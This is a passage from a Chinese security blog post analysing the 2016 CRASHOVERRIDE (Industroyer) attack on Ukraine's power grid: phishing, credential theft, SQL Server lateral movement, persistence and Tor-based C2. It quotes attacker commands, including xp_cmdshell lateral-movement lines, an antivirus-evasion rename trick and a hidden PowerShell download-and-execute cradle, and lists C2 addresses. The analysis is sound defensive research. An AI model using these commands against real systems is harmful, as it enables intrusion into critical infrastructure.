---
title: 第115篇：俄乌网络战之二，乌克兰第2次大停电事件复盘
url: https://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247487377&idx=1&sn=f529c0ec1eb1c2822155f2a03f0c7fbd&chksm=c25fc0eaf52849fc0d9633208b5bad2676a3b64410c0fe687f919721bb83b607980f9a97c200&scene=58&subscene=0#rd
source: 希潭实验室
date: 2025-01-27
fetch_date: 2025-10-06T20:09:16.791999
---

# 第115篇：俄乌网络战之二，乌克兰第2次大停电事件复盘

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/OAz0RNU450A06CSoLE5iaRpQlYJ7QBI8PrQAVI3MtLicflERGH5mRq3XH2ZUR1a7GXp9HiazBGhxgjLuL1dmicl7KQ/0?wx_fmt=jpeg)

# 第115篇：俄乌网络战之二，乌克兰第2次大停电事件复盘

原创

abc123info

希潭实验室

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450ATcz6jUJnFNeOxRzVZ9Lbc0INLwTJTZT1GaNutZrfDn6csvjBoS2ox0efLUEexXqPEcVbYfbLo8w/640?wx_fmt=png)

## **Part1 前言**

**大家好，我是ABC\_123**。上一篇文章给大家分享了俄乌网络战中，沙虫APT组织致乌克兰第1次大停电事故的技术细节，反响还不错。乌克兰历史上总共发生3次大停电事故，分别是在2015年、2016年、2022年。今天ABC\_123继续为大家分享第2次停电事故的技术细节，该APT攻击事件公布出来的资料非常少，因而分析难度非常大。

**注：**上一篇文章链接如下《[第113篇：俄乌网络战之一，沙虫APT组织致乌克兰第1次大停电事件复盘](https://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247487328&idx=1&sn=30025bdaa48f72813c8aa4eede465a9e&scene=21#wechat_redirect)》

![](https://mmbiz.qpic.cn/mmbiz_jpg/OAz0RNU450Dq1Q8s4COc7InkMO0jIGjiaGho1fcJicpibWB4vzvIM1wAib9TiakVECbIM5S0mHCTTeGJJibWtCe25vXw/640?wx_fmt=jpeg&from=appmsg)

**Part2 技术研究过程**

* ## **乌克兰第2次停电事件背景**

2016年12月17日，ELECTRUM团队通过钓鱼邮件渗透了乌克兰首都基辅及周边地区的电力网络，造成乌克兰首都基辅及其北部地区停电大约1个小时，攻击目标为诺威佩特里夫茨村的北部变电站自动化控制系统。此次攻击由与俄罗斯沙虫（Sandworm）APT组织相关的分支团队ELECTRUM发起，并使用名为**CRASHOVERRIDE（又称Industroyer）**的模块化恶意软件框架。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450BZiafgVPJkvpXW7fosLn48zca647fxTbfZWhhQLxCnzQrRRokvwjyia2L7xAuOiaFI4J1DWbjxqwgqw/640?wx_fmt=png&from=appmsg)

CRASHOVERRIDE是第4个针对ICS的恶意软件，前3个是震网病毒STUXNET、黑色能量BLACKENERGY 2和HAVEX。它是第2个用于设计和破坏工业控制系统ICS的恶意软件（STUXNET震网病毒是第1个），也是第1个针对电网电力系统攻击的恶意软件。它通过模块化结构部署多个针对ICS通信协议的攻击payload，干扰电力传输。**与2015年乌克兰电网攻击相比，CRASHOVERRIDE通过框架组件化的方式实现了更高的自动化，不再依赖人工操作鼠标进行断电**，攻击技术更为复杂，深刻理解了电网传输协议的工作原理，还攻击了保护继电器设备，显示出攻击团队已掌握高度针对性的ICS攻击方法。

在CRASHOVERRIDE的攻击中，操控的控制系统数量远超过实际发生的停电事件。攻击涉及至少七个OPC服务器和多个管理的OPC实例，至少八个IEC-101控制器以及超过400个IEC-104通信控制点。攻击团队试图在数百个独立的控制系统之间引发大范围的停电，目标是制造比2015年事件更大规模的破坏性影响，但是对目标环境中设备复杂性和协议实现差异的理解不足，部分设备拒绝或忽略了伪造的通信数据，**导致攻击未达到预期效果**。

* ## **鱼叉式邮件钓鱼过程**

CRASHOVERRIDE攻击的外网入口可能来源于多种途径：攻击者可能利用了BlackEnergy 3遗留的入口，也可能是GreyEnergy僵尸网络在前期进行信息收集的结果。此外，安全公司分析发现，攻击最初可能源于2016年1月发起的一场针对乌克兰关键基础设施单位的鱼叉式网络钓鱼活动。一封于2016年1月19日发送的鱼叉钓鱼邮件包含带有恶意XLS文件的附件，表明攻击者早在同年10月之前已成功完成初步访问并驻留在目标IT网络中。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450A06CSoLE5iaRpQlYJ7QBI8PXSiceNQh0fQUDn6kicpibIM3wdO5k8U0Ea4wVFLZToHa0sjZyWuedu4Ew/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/OAz0RNU450DYDHLwwzicJEP2WIvz9mmlXibXUibGoeFklyQAY6pePibC7Y817fTeL4LNWRuiaXDNibpS6VeoQTFvHAicg/640?wx_fmt=jpeg&from=appmsg)

该电子邮件包含HTML内容，其中包含指向远程服务器上的.PNG文件的链接，这使得攻击者能够收到通知，确认目标已接收并打开邮件。我们观察到过去BlackEnergy组织也使用过同样有趣的技术。电子邮件的HTML内容包含指向远程服务器上PNG文件的链接。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450A06CSoLE5iaRpQlYJ7QBI8PPHiblPz2lD1DSGDA5iaUibtVYKmpCnAynJhreib075rh9P5A9tmQZr0o4g/640?wx_fmt=png&from=appmsg)

同样有趣的是，PNG文件的名称是Base64编码的字符串“mail\_受害者的邮箱地址”。如下图所示，攻击中使用的攻击中使用的 XLS 文件。它通过社会工程手段试图诱骗收件人忽视Microsoft Office内置的安全警告，从而无意中执行宏。“**注意！此文档是在较新版本的Microsoft Office中创建的。需要启用宏才能显示文档内容。**”执行宏会启动一个恶意的木马下载器，该下载器试图从远程服务器下载并执行最终的恶意载荷。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450A06CSoLE5iaRpQlYJ7QBI8PHVQWEotibsmibKluo8a9H8BoPsM5sibhiboJibGz8iaNFdK9zKMJ1ic9icqVnw/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/OAz0RNU450DYDHLwwzicJEP2WIvz9mmlX6XuAaIiaE1TaPOuW4Vib3l7AwfBK2VXXEfGdRo1aXHYLvTb5qO8y4s1w/640?wx_fmt=jpeg&from=appmsg)

* ## **IT网络驻留与信息收集**

攻击者入侵了乌克兰电力公司的内部网络，并获得对传输系统的远程控制权限。攻击者首先对乌克兰电力公司的网络进行侦察，寻找潜在的漏洞和入口点。他们可能利用钓鱼邮件、恶意链接或其他社会工程学手段，成功渗透到目标网络中。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450A06CSoLE5iaRpQlYJ7QBI8PkkC54evEUziaKgPg8yb6SDTiashmk8MLiaoIKiaBqNFbNvAsfGPicVS4kYA/640?wx_fmt=png&from=appmsg)

在2016年1月至10月期间，在攻击者实施大规模钓鱼攻击之后的这段时间里，ELECTRUM长期潜伏在乌克兰电力系统网络中，通过大量的信息收集和侦察，不断收集内网的账号密码和身份凭据，不断渗透并获得额外的权限，其中包括使用公开的mimikatz源代码进行编译，并使用UPX进行打包，减少工具的体积。与 2015 年乌克兰停电事件类似，ELECTRUM 可能通过重复使用合法凭据远程登录 ICS 环境中的设备，或利用现有的 VPN 连接进行操作。

* ## **从IT网络向ICS工控系统迁移**

**2016年12月初**，利用这些账号获取一个可以既可以连接到IT网络又可以进入ICS工业控制系统的多网卡设备，这些设备权限就成了进入ICS环境的跳板机。

**12月1日 01:28**，攻击者在这一跳板机ICS访问服务器上进行了用户账户修改，通过运行脚本文件创建两个新的本地账户：“admin”和“система”。这些账户被授予域内访问权限。

**12月1日 01:29**，攻击者在禁用了系统的事件日志记录功能，清除入侵痕迹。

**12月12日中旬**，ICS环境中用来存储工控系统的状态信息和日志信息的3台win2003系统的SQLServer数据库被入侵，它们采用相同的命名模式，如“Device-1”、“Device-2”，这些数据库主机与ICS环境中其他的主机广泛连接，甚至可以直接参与设备的流程操控。

**12月12日 13:00**，攻击者对ICS环境内网中的关键设备进行大约2个小时的扫描探测和信息收集，例如列目录操作、查看目录信息、测试受害环境中与其它ICS主机的网络连通性等。随后，ELECTRUM 执行了一段脚本，使用的是“Administrator”用户和相同的密码，对内网100多个主机进行了快速的RPC身份验证尝试。

**上述操作表明攻击者在12月初访问 ICS 环境与12月中旬观察到的活动之间，进行了大量ISC内网探测活动**。并通过SQLServer数据库主机的exec xp\_cmdshell命令进行内网横向拓展，进行恶意文件传输、系统扫描、网络检查等。

* **借助SQLServer横向渗透**

**1、**ELECTRUM组织利用如下命令在不同服务器之间创建链接：

"BEGIN EXEC master.dbo.sp\_addlinkedserver @server = N'" & strLink & "', @srvproduct=N'SQL Server'; EXEC master.dbo.sp\_addlinkedsrvlogin @rmtsrvname=N'" & strLink & "',@useself=N'False',@rmtuser=N'admin',@rmtpassword='<PASSWORD>'; END;"

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450A06CSoLE5iaRpQlYJ7QBI8PkPQxfj0rloAuHJXP1gzP8eMysibFG2JwrSfawjm73RHvrI7iaOKaHBiaw/640?wx_fmt=png&from=appmsg)

**2、**ELECTRUM组织使用了很多操作系统自带的命令进行内网横向，除了 CRASHOVERRIDE恶意样本之外，并未发现其他的恶意程序，攻击者会将可执行文件以.txt白名单扩展名传输到ICS主机中，通过move命令更名为.exe格式，以绕过杀软防护。所执行命令的示例如下：

EXEC xp\_cmdshell 'net use L: \\<TargetIP>\$C <Password> /USER:<Domain>\<User>'
EXEC xp\_cmdshell 'move C:\Delta\m32.txt C:\Delta\m32.exe'
EXEC xp\_cmdshell 'netstat -an'

**3、**ELECTRUM组织部署了一个较大的脚本文件“remote.vbs”，可以在给定IP、用户名和密码的情况下远程查询另一系统：

EXEC xp\_cmdshell 'cscript C:\Delta\remote.vbs /s:<TargetIP> /u:<UserName> /p:<Password> /t:-r arp -a'
EXEC xp\_cmdshell 'cscript C:\Delta\remote.vbs /s:<TargetIP> /u:<UserName> /p:<Password> /t:-r dir C:\intel\'

**4、**攻击者使用BAT脚本，调用powershell执行命令：

powershell.exe -nop -w hidden -c $l=newobject net.webclient;$l.proxy=[Net.WebRequest]::GetSystemWebProxy();$l.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $l.downloadstring('http://x.x.x.x:8801/msupdate');

此外，攻击者使用脚本和SysInternals软件包中较老版本的psexec程序进行渗透，PSExec文件重命名为“ps.exe”进行使用。通过网络内部的横向移动，攻击者扩大了对关键系统的访问权限，特别是针对工业控制系统（ICS）和SCADA设备。攻击者收集了有关电力系统的详细信息，包括保护继电器的配置、SCADA系统的通信协议等，为后续攻击奠定基础。

* ## **CRASHOVERRID后门部署**

CRASHOVERRIDE本身至少由三部分组成（在大多数情况下是四部分）：一个启动器可执行文件；一个特定于ICS协议的负载模块，DLL格式；一个清除负载模块，也是DLL格式；以及大多数效果负载的配置文件。它通过名为Crash的导出函数加载模块DLL。新的线程在执行机器上以最高优先级创建。控制权然后从启动程序传递给加载的模块，**启动程序会在等待2小时后执行数据擦除模块**。

在经过2016年12月12日至15日一段时间的侦察后，ELECTRUM团队于2016年12月16日开始将CRASHOVERRIDE框架部署到目标主机上。在经过连通性测试和其他可行性验证之后，12月17日通过编写BAT脚本文件，将CRASHOVERRIDE的各个攻击模块推送到其他主机上，复制到受感染的目标设备的C:\Backinfo目录上，并通过列目录命令检查是否投递成功。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450A06CSoLE5iaRpQlYJ7QBI8PjgHK1mfynLWILVQuZuAoWQg2zNficdeq4IsK6D32pKoU9x079WwT4hA/640?wx_fmt=png&from=appmsg)

通过net use命令将启动器模块复制到目标主机上，以下是‘101\_copy.bat’和‘104\_copy.bat’中的一些示例行：

cscript C:\Backinfo\ufn.vbs <TargetIP>"C:\Backinfo\ImapiService.exe" "C:\Delta\svchost.exe"

cscript C:\Backinfo\ufn.vbs <TargetIP>"C:\Backinfo\101.dll" "C:\Delta\101.dll"

cscript C:\Backinfo\ufn.vbs <TargetIP>"C:\Backinfo\139.ini" "C:\Delta\101.ini"

cscript C:\Backinfo\ufn.vbs <TargetIP>"C:\Backinfo\haslo.dat" "C:\Delta\haslo.dat"

cscript C:\Backinfo\sqlc.vbs "<TargetIP>" "-c""dir C:\Delta\"

到12月17日，**ELECTRUM通过脚本remote.vbs在目标主机上创建了一个自启动服务defragsvc或imapiservice，以确保CRASHOVERRIDE负载模块能够持久化执行**。为了实现不同受害主机之间的协调攻击断电效果，服务并未立即启动，而是根据内置的硬编码激活时间戳，统一在2016年12月17日的特定时间自启动攻击。识别出的时间戳为2016年12月17日 22:27 UTC、2016年12月20日 06:30 UTC。

EXEC xp\_cmdshell 'cscript C:\Delta\remote.vbs /s:<TargetIP> /u:<Host/Domain>\<User> /p:<Password> /t:-c sc config imapiservice binPath= "C:\Intel\imapi.exe C:\Intel\ imapi.dll i.ini" start= auto';

* ## **利用Tor匿名网络通信**

攻击者通过C2服务器（如195.16.88.6、93.115.27.57、5.39.218.152等）运行Tor软件，并在跳板机上监听3128代理Squid，处理和转发恶意软件的HTTP/HTTPS通信。后门程序在受感染设备上运行，通信流量经过内网跳板机并转发到外部网络，最终通过Tor网络连接到C2服务器。Tor网络通过多层加密和中转节点将流量传递至C2服务器，使攻击者可以在非工作时间内减少流量探测的风险。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450DYDHLwwzicJEP2WIvz9mmlXRmIicmeDCiaDf0USh4cdiaYpyeTPMWqeNCfDeSc5xCumvErgDnwSq7TrA/640?wx_fmt=png&from=appmsg)

通过这种代理机制，后门定期向C2服务器报告设备状态，获取指令并执行，如关闭断路器或修改控制信号，执行结果通过同一路径返回。攻击者通过该跳板主机扫描内网，寻找目标设备（如104从站、OPC服务器等），一旦确定目标，配置该主机作为Main Backdoor的代理IP，通过它与RTU或PLC通信并进行控制。Main Backdoor模块处理来自C&C服务器的控制命令，创建线程来响应攻击者的请求。

* ## **端口扫描组件**

攻击者的工具库中包含一个端口扫描工具，可用于绘制网络地图并找到与攻击相关的计算机。有趣的是，攻击者没有使用现有的软件，而是构建了自己的定制端口扫描器。如图 19 所示，攻击者可以定义...